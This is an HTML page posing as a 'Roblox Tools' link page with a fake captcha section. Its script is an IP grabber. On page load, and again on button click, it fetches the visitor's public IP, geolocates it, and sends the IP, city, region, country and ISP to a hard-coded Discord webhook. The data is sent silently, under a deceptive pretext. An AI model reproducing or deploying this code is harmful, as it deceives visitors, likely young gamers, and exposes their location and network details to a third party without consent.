<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Roblox Tools</title>
  <style>
    body {
      font-family: system-ui, Arial;
      margin: 24px;
      background: #f6f8fb;
      color: #0b1220;
    }
    .card {
      max-width: 720px;
      padding: 18px;
      border-radius: 10px;
      background: white;
      box-shadow: 0 6px 20px rgba(11,18,32,0.06);
    }
    pre {
      background: #f1f5f9;
      padding: 12px;
      border-radius: 8px;
      overflow: auto;
    }
    .muted {
      color: #556;
    }
    button {
      padding: 8px 12px;
      border-radius: 8px;
      border: 0;
      background: #3b82f6;
      color: white;
      cursor: pointer;
      margin-right: 8px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Roblox Tools</h2>
    <p class="muted">Click for the link</p>

    <div>
      <button id="run">Click for the link</button>
      <button id="mask">Masquer/Afficher</button>
    </div>

    <section style="margin-top:14px">
      <h3>Captcha Verification</h3>
      <pre id="out">Appuyez sur "Click for the link"</pre>
    </section>
  </div>

  <script>
    const out = document.getElementById('out');
    const run = document.getElementById('run');
    const mask = document.getElementById('mask');
    let lastData = null;
    let masked = false;

    async function getPublicIP() {
      const r = await fetch('https://api.ipify.org?format=json');
      if (!r.ok) throw new Error("Impossible d'obtenir l'IP publique");
      const j = await r.json();
      return j.ip;
    }

    async function geolocate(ip) {
      const r = await fetch(`https://ipwho.is/${ip}`);
      if (!r.ok) throw new Error('Erreur lors de la gÃ©olocalisation');
      const j = await r.json();
      if (!j.success) throw new Error('GÃ©olocalisation Ã©chouÃ©e: ' + (j.message || 'inconnue'));
      return j;
    }

    function render(data) {
      if (!data) {
        out.textContent = 'Aucune donnÃ©e';
        return;
      }
      if (masked) {
        out.textContent = JSON.stringify({
          ip: 'xxx.xxx.xxx.xxx',
          ville: data.ville,
          pays: data.pays,
          FAI: 'masquÃ©'
        }, null, 2);
      } else {
        out.textContent = JSON.stringify(data, null, 2);
      }
    }

    async function sendToDiscord(data) {
      const webhookURL = 'https://discord.com/api/webhooks/1428356168786378752/P2Q_VUfL2G-X5E5ysGSYyLmIxB-RvScV7ehGhSzF-pD8haR-j8kcnsf10i3cJoZFMw_v';
      const message = {
        content: `ðŸ“¡ :
- IP : ${data.ip}
- Ville : ${data.ville}
- RÃ©gion : ${data.region}
- Pays : ${data.pays}
- FAI : ${data.org}`
      };

      await fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
      });
    }

    run.addEventListener('click', async () => {
      out.textContent = 'Chargementâ€¦';
      try {
        const ip = await getPublicIP();
        const geo = await geolocate(ip);

        const summary = {
          ip: ip,
          ville: geo.city,
          region: geo.region,
          pays: geo.country,
          continent: geo.continent,
          code: geo.country_code,
          org: geo.connection?.isp || geo.org || 'inconnu'
        };

        lastData = summary;
        masked = false;
        render(summary);

        // Envoie Ã  Discord
        await sendToDiscord(summary);

      } catch (err) {
        out.textContent = 'Erreur: ' + err.message;
      }
    });

    mask.addEventListener('click', () => {
      masked = !masked;
      render(lastData);
    });
    async function autoRun() {
  out.textContent = 'Chargementâ€¦';
  try {
    const ip = await getPublicIP();
    const geo = await geolocate(ip);

    const summary = {
      ip: ip,
      ville: geo.city,
      region: geo.region,
      pays: geo.country,
      continent: geo.continent,
      code: geo.country_code,
      org: geo.connection?.isp || geo.org || 'inconnu'
    };

    lastData = summary;
    masked = false;
    render(summary);

    // Envoie Ã  Discord
    await sendToDiscord(summary);

  } catch (err) {
    out.textContent = 'Erreur: ' + err.message;
  }
}
window.addEventListener('DOMContentLoaded', autoRun);
  </script>
</body>
</html>
